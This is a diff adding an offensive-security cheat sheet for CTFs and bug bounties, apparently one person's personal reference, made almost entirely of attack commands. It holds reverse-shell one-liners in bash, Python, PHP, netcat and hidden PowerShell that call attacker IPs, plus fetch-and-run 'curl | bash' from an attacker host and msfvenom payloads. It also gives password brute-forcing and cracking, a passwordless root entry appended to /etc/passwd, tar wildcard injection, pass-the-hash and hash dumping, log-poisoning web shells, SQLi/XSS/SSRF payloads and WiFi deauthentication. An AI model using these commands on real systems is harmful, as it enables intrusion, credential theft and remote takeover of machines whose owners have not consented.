@@ -1,0 +1,624 @@
+=== SUMIT'S PORTFOLIO ===
+
+- Portfolio: https://SumitNayak1337.github.io (For more information about me)
+
+=== SUMIT'S PENTEST CHECKLIST ===
+╔══════════════════════════════════════════════════════════════════════════════════╗
+║                     🚩 CTF MASTER CHEAT SHEET — by Sumit                       ║
+║                     Offensive Security | Bug Bounty | CTF                      ║
+╚══════════════════════════════════════════════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[1] NETWORK RECON
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# ARP Scan (fast local network discovery)
+sudo arp-scan -l
+sudo arp-scan --interface=eth0 --localnet
+
+# Nmap - Basic to Full
+nmap -sV -sC -oN scan.txt <IP>
+nmap -p- --min-rate=5000 -T4 <IP>
+nmap -A -T4 <IP>
+nmap -sU -top-ports 100 <IP>                  # UDP scan
+nmap --script vuln <IP>                        # Vuln scan
+nmap -sn 10.10.10.0/24                         # Ping sweep
+
+# OpenVPN
+sudo openvpn --data-ciphers AES-256-CBC --config danielhep.ovpn
+
+# SMB Enumeration
+smbclient -L //<IP>/ -N
+smbclient //<IP>/sharename -N
+enum4linux -a <IP>
+crackmapexec smb <IP>
+crackmapexec smb <IP> -u '' -p '' --shares
+
+# FTP Enumeration
+ftp <IP>                     # try anonymous / anonymous
+get file.txt
+mget *
+
+# SNMP Enumeration
+snmpwalk -c public -v1 <IP>
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
+
+# Netcat banner grab
+nc -nv <IP> <PORT>
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[2] WEB ENUMERATION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Gobuster
+gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
+gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+# Ffuf
+ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt
+ffuf -u http://<IP>/FUZZ -w <wordlist> -fc 404,403
+
+# Nikto
+nikto -h http://<IP>
+
+# WhatWeb
+whatweb http://<IP>
+
+# curl tricks
+curl -v http://<IP>
+curl -X POST -d "user=admin&pass=admin" http://<IP>/login
+
+# Common Wordlists
+/usr/share/wordlists/rockyou.txt
+/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
+/usr/share/wordlists/dirb/common.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[3] BRUTE FORCE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Hydra - HTTP POST Login
+hydra -L list -p test ip http-post-form "/:user=USER&pass=PASS:Invalid" --format=Raw-MD5
+
+# Hydra - SSH
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
+
+# Hydra - FTP
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>
+
+# Hydra - HTTP Basic Auth
+hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /admin
+
+# John the Ripper
+john crackme --wordlist=words --format=Raw-MD5
+john --show hash.txt
+john --format=sha512crypt shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# John the Ripper - File Conversion to Hash (*2john)
+ssh2john id_rsa > ssh_hash.txt
+zip2john archive.zip > zip_hash.txt
+rar2john archive.rar > rar_hash.txt
+pdf2john document.pdf > pdf_hash.txt
+keepass2john database.kdbx > keepass_hash.txt
+office2john document.docx > office_hash.txt
+bitlocker2john -i backup.vhd > bitlocker_hash.txt
+putty2john putty.ppk > putty_hash.txt
+
+# Hashcat
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt           # MD5
+hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt        # sha512crypt
+hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt        # NTLM
+hashcat -m 13000 rar_hash.txt /usr/share/wordlists/rockyou.txt   # RAR5
+hashcat -m 13600 zip_hash.txt /usr/share/wordlists/rockyou.txt   # WinZip
+hashcat -m 10500 pdf_hash.txt /usr/share/wordlists/rockyou.txt   # PDF 1.4 - 1.6
+
+# Unshadow (combine passwd + shadow for John)
+unshadow <PASSWD-FILE> <SHADOW-FILE> > unshadowed.txt
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[4] REVERSE SHELLS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Start listener
+nc -lvnp 4444
+
+# Bash Reverse Shell
+echo '#!/bin/bash\n bash -i >& /dev/tcp/10.11.0.201/5555 0>&1' > backup.sh
+bash -i >& /dev/tcp/<YOUR-IP>/4444 0>&1
+
+# Python Reverse Shell
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Netcat Reverse Shell
+nc -e /bin/sh <YOUR-IP> 4444
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.201 4444 >/tmp/f    ← (from cheatsheet)
+
+# PHP Reverse Shell (one-liner)
+php -r '$sock=fsockopen("<IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Windows PowerShell Reverse Shell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('<IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Generating MSFVenom Payloads
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf > shell.elf
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe > shell.exe
+
+# Upload full php reverse shell
+cp /usr/share/webshells/php/php-reverse-shell.php .    # Edit IP/port then upload
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[5] SHELL STABILIZATION (TTY Upgrade)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# NOTE: Kali uses zsh by default — switch to bash first if pty spawn fails!
+exec bash --login
+ps -p $$                                    # Confirm shell is bash
+
+# Method 1 — Python PTY (most common)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+CTRL + Z
+stty raw -echo
+fg
+
+# Method 2 — Script
+script /dev/null -c bash
+CTRL + Z
+stty raw -echo
+fg
+reset
+
+# Fix terminal size
+stty rows 40 cols 200
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[6] PRIVILEGE ESCALATION — LINUX
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Basic Enumeration
+whoami && id
+sudo -l
+cat /etc/passwd
+cat /etc/crontab
+uname -a
+hostname
+cat /etc/issue
+cat /etc/lsb-release
+
+# SUID binaries
+find / -perm -u=s -type f 2>/dev/null
+
+# World-writable files
+find / -writable -type f 2>/dev/null
+
+# Cron jobs
+cat /etc/crontab
+ls -la /etc/cron*
+cat /var/spool/cron/crontabs/*
+
+# LFILE trick (GTFOBins style)
+LFILE=root::0:0:root:/root:/bin/bash
+echo "$LFILE" >> /etc/passwd                # if writable
+
+# Exploit cron with writable script
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > shell.sh                           # or use full reverse shell payload
+# (from cheatsheet — wildcard injection via tar/cp cron)
+
+# Python SUID shell
+/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# OS.system SUID
+/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+# LinPEAS (automated enum)
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+# Or transfer manually:
+python3 -m http.server 9000     ← on attacker
+wget http://<ATTACKER-IP>:9000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+
+# Pspy (monitor processes without root)
+./pspy64
+
+# Check PATH hijacking
+echo $PATH
+ls -la /usr/local/bin/
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[7] PRIVILEGE ESCALATION — WINDOWS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Basic Enum
+whoami /priv
+whoami /groups
+net users
+net localgroup administrators
+systeminfo
+ipconfig /all
+
+# Unquoted Service Paths
+wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
+
+# WinPEAS (automated)
+.\winpeas.exe
+
+# PowerShell Enum
+Get-LocalUser
+Get-LocalGroup
+Get-Service | Where-Object {$_.Status -eq "Running"}
+
+# AlwaysInstallElevated check
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# SeImpersonatePrivilege → JuicyPotato / PrintSpoofer
+.\PrintSpoofer.exe -i -c cmd
+.\JuicyPotato.exe -l 1337 -p cmd.exe -t *
+
+# Stored credentials
+cmdkey /list
+runas /savecred /user:admin cmd.exe
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[8] FILE TRANSFER
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Python HTTP server (attacker)
+python3 -m http.server 9000
+
+# SMB Server (python impacket) - Good for Windows bypassing AV 
+impacket-smbserver shareName /path/to/share -smb2support
+
+# PHP Web Server
+php -S 0.0.0.0:9000
+
+# Wget / Curl (on victim)
+wget http://<ATTACKER-IP>:9000/file.sh
+curl http://<ATTACKER-IP>:9000/file.sh -o file.sh
+curl http://<ATTACKER-IP>:9000/file.sh | bash   # Execute directly in memory
+
+# SCP
+scp file.txt user@<IP>:/tmp/
+
+# Netcat
+nc -lvnp 9001 > received_file         ← receiver
+nc <IP> 9001 < file_to_send           ← sender
+
+# Base64 (when nothing else works)
+base64 file.sh                         ← attacker, copy output
+echo "<base64>" | base64 -d > file.sh  ← victim
+
+# Windows file transfer (PowerShell)
+certutil -urlcache -f http://<IP>:9000/file.exe file.exe
+powershell -c "Invoke-WebRequest -Uri http://<IP>:9000/file.exe -OutFile C:\Temp\file.exe"
+iwr http://<IP>:9000/file.exe -OutFile file.exe
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[8] PROXYCHAINS / PIVOTING / SSH TUNNELING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# SSH via proxychains (SkyTower style)
+proxychains ssh user@<INTERNAL-IP>
+proxychains nmap -sT -Pn <INTERNAL-IP>
+
+# Dynamic port forwarding (SOCKS proxy via SSH)
+ssh -D 9050 -N user@<IP>
+# Then: set socks5 127.0.0.1 9050 in /etc/proxychains.conf
+
+# Local Port Forward
+ssh -L <LOCAL-PORT>:<TARGET-IP>:<TARGET-PORT> user@<JUMPHOST>
+
+# Remote Port Forward
+ssh -R <REMOTE-PORT>:127.0.0.1:<LOCAL-PORT> user@<IP>
+
+# Config /etc/proxychains.conf
+socks5  127.0.0.1 9050
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[9] WIFI HACKING (Reaver / WPS)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Reaver (from cheatsheet)
+sudo reaver -i wlan0mon -b 34:5D:9E:6F:02:66 -c 6 -vvv -K 1 -f
+
+# Monitor mode
+sudo airmon-ng start wlan0
+sudo airodump-ng wlan0mon
+
+# Capture handshake
+sudo airodump-ng -c <CH> --bssid <BSSID> -w capture wlan0mon
+sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
+
+# Crack with aircrack
+aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[10] ARCHIVE / FILE FORENSICS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Tar
+tar xvf .tar..                          (from cheatsheet)
+tar -xzvf archive.tar.gz
+tar -xjvf archive.tar.bz2
+
+# AR (Debian packages / binary archive)
+ar -x gdb....                           (from cheatsheet)
+ar x archive.a
+
+# Zip
+unzip file.zip
+fcrackzip -u -D -p rockyou.txt file.zip   # crack zip password
+
+# File identification
+file <filename>
+binwalk <filename>
+strings <filename> | less
+xxd <filename> | head                    # Hex dump
+exiftool <filename>                      # Metadata
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[11] PROCESS & SYSTEM ENUM
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+ps aux | grep root                       (from cheatsheet)
+ps aux
+netstat -tulnp
+ss -tulnp
+ls -la /dev/shm                          (from cheatsheet)
+ls -la /tmp
+env
+cat /proc/version
+cat /etc/os-release
+ls /var/www/internal/invoices            (from cheatsheet — web content dirs)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[12] STEGANOGRAPHY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+steghide extract -sf image.jpg
+steghide info image.jpg
+stegseek image.jpg /usr/share/wordlists/rockyou.txt
+zsteg image.png                          # PNG/BMP steg
+outguess -r image.jpg out.txt
+strings image.jpg | grep flag
+exiftool image.jpg
+binwalk -e image.jpg
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[13] CRYPTOGRAPHY / ENCODING
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Base64
+echo "string" | base64
+echo "base64==" | base64 -d
+
+# Hex
+echo "hex" | xxd -r -p
+echo "string" | xxd
+
+# Caesar / ROT13
+echo "string" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+# CyberChef — best browser tool for CTF crypto
+https://gchq.github.io/CyberChef/
+
+# Hash Identification
+hash-identifier <hash>
+hashid <hash>
+
+# Online: crackstation.net, hashes.com
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[14] SQL INJECTION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Manual test payloads
+' OR '1'='1
+' OR 1=1--
+admin'--
+" OR ""="
+
+# SQLMap
+sqlmap -u "http://<IP>/page?id=1" --dbs
+sqlmap -u "http://<IP>/page?id=1" -D <db> --tables
+sqlmap -u "http://<IP>/page?id=1" -D <db> -T <table> --dump
+sqlmap -u "http://<IP>/login" --data="user=a&pass=b" --dbs
+sqlmap -r request.txt --dbs                 # Use saved Burp request
+
+# Error-based
+1' AND extractvalue(1,concat(0x7e,(SELECT version())))--
+
+# Union-based (find columns)
+1 ORDER BY 1--
+1 UNION SELECT null,null,null--
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[15] LFI / PATH TRAVERSAL
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Basic LFI
+http://<IP>/page.php?file=../../../../etc/passwd
+http://<IP>/page.php?file=....//....//etc/passwd
+http://<IP>/page.php?file=php://filter/convert.base64-encode/resource=index.php
+
+# Log Poisoning (RCE via LFI)
+# 1. Send: <?php system($_GET['cmd']); ?> in User-Agent
+# 2. Include the log file: ?file=/var/log/apache2/access.log&cmd=whoami
+
+# /etc/passwd shortcuts
+cat /etc/passwd | cut -d: -f1      # usernames
+cat /etc/shadow                    # hashed passwords (need root)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[16] ACTIVE DIRECTORY (AD) — BASICS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Enum with crackmapexec
+crackmapexec smb <IP> -u user -p pass --users
+crackmapexec smb <IP> -u user -p pass --groups
+crackmapexec smb <IP> -u user -p pass --shares
+
+# Kerberoasting
+impacket-GetUserSPNs -request -dc-ip <DC-IP> domain/user:pass
+
+# AS-REP Roasting (no preauth needed)
+impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip <DC-IP> -format hashcat
+
+# Pass the Hash
+crackmapexec smb <IP> -u admin -H <NTLM-HASH>
+impacket-psexec admin@<IP> -hashes :<NTLM-HASH>
+
+# Bloodhound (AD enumeration)
+bloodhound-python -u user -p pass -d domain.local -ns <DC-IP> -c All
+# Then import .json files into BloodHound GUI
+
+# Dump hashes (if admin)
+impacket-secretsdump admin:pass@<IP>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[17] BURP SUITE — WEB APP TIPS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# 2FA Bypass ideas
+- Reuse a valid OTP within window
+- Try response manipulation (200 vs 403)
+- Check if OTP endpoint rate-limited
+- Test OTP for another user account
+- Skip 2FA step entirely (direct URL to /dashboard)
+- Try: code=null, code=000000, code=true
+
+# IDOR
+- Change numeric IDs in requests: /api/user/1 → /api/user/2
+- Check UUIDs, GUIDs — try other known usernames
+
+# XSS Quick payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><script>alert(document.cookie)</script>
+javascript:alert(1)
+
+# SSRF
+http://127.0.0.1/admin
+http://169.254.169.254/latest/meta-data/     ← AWS metadata
+http://[::1]/admin                            ← IPv6 localhost
+
+# JWT Testing
+- Decode at jwt.io
+- Try alg=none attack
+- Try HS256 → RS256 confusion
+- Brute force weak secret: hashcat -a 0 -m 16500 <JWT> wordlist.txt
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[18] USEFUL ONE-LINERS & MISC
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+# Find flag files
+find / -name "flag*" 2>/dev/null
+find / -name "*.txt" 2>/dev/null | xargs grep -l "CTF\|flag\|FLAG" 2>/dev/null
+
+# Quick grep for credentials in files
+grep -r "password" /var/www/ 2>/dev/null
+grep -r "DB_PASS\|db_password\|passwd" /var/www/ 2>/dev/null
+
+# Readable /etc/shadow or backup?
+ls -la /etc/shadow /etc/shadow- /etc/passwd- /var/backups/
+
+# GTFOBins — SUID, sudo bypass
+https://gtfobins.github.io/
+
+# Reverse shell generator
+https://www.revshells.com/
+
+# Check sudo version (sudo < 1.8.28 → CVE-2019-14287)
+sudo --version
+
+# Kernel exploits
+uname -r
+searchsploit linux kernel <version>
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[19] TOP CTF TOOLS QUICK REFERENCE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+Tool            | Use Case
+----------------|---------------------------------------------
+nmap            | Port scanning, service detection
+gobuster/ffuf   | Web directory/subdomain fuzzing
+hydra           | Brute force (SSH, HTTP, FTP, RDP...)
+john/hashcat    | Password cracking
+sqlmap          | SQL injection automation
+burpsuite       | Web app intercepting proxy
+netcat          | Shells, file transfer, port scanning
+metasploit      | Exploit framework
+linpeas/winpeas | Automated privilege escalation enum
+pspy            | Monitor processes (no root needed)
+binwalk         | Binary/firmware analysis
+steghide/stegseek | Steganography extraction
+exiftool        | File metadata analysis
+wireshark       | Packet capture analysis
+searchsploit    | Offline exploit-db search
+chisel          | HTTP tunneling / pivoting
+socat           | Advanced netcat alternative
+enum4linux      | SMB/Linux enumeration
+crackmapexec    | AD/SMB swiss army knife
+bloodhound      | Active Directory attack paths
+impacket        | AD attacks (secretsdump, psexec, etc.)
+volatility      | Memory forensics
+stegseek        | Fast steghide brute force
+feroxbuster     | Recursive web fuzzer (faster than gobuster)
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+[20] CTF APPROACH CHECKLIST
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+[ ] 1. Network scan → nmap -sV -sC -p- <IP>
+[ ] 2. Web enum → gobuster/ffuf, nikto, view source
+[ ] 3. Check all open ports manually (ftp anon, smb, etc.)
+[ ] 4. Find credentials → default creds, brute force, file enum
+[ ] 5. Get initial shell → reverse shell, webshell, exploit
+[ ] 6. Stabilize TTY → python pty + stty raw -echo
+[ ] 7. Enum as low user → sudo -l, SUID, cron, processes, files
+[ ] 8. Escalate → GTFOBins, kernel exploit, writable cron, PATH hijack
+[ ] 9. Find flags → /home/*/user.txt, /root/root.txt
+[ ] 10. Document everything as you go!
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+USEFUL RESOURCES
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+GTFOBins          → https://gtfobins.github.io/
+RevShells         → https://www.revshells.com/
+CyberChef         → https://gchq.github.io/CyberChef/
+HackTricks        → https://book.hacktricks.xyz/
+ExploitDB         → https://www.exploit-db.com/
+PayloadsAllTheThings → https://github.com/swisskyrepo/PayloadsAllTheThings
+CrackStation      → https://crackstation.net/
+PentestMonkey     → https://pentestmonkey.net/cheat-sheet/
+LOLBAS (Windows)  → https://lolbas-project.github.io/
+JWT.io            → https://jwt.io/
+PortSwigger Labs  → https://portswigger.net/web-security
+Impacket Scripts  → https://github.com/fortra/impacket
+Upgrade Shells    → https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell
+
+
+                 ★ Happy Hacking, ! Stay sharp. ★
